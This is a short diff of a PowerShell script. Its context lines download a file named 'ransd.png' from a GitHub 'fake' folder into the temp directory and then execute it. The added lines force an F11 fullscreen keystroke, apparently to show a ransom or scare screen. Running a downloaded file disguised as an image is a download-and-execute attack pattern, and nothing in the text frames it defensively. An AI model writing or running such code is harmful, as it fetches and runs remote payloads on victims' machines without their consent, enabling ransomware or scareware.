@@ -6,3 +6,5 @@ $url2 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
 $output2 = "$env:TEMP\ransd.png"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
 & $output2
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.SendKeys]::SendWait("{F11}")
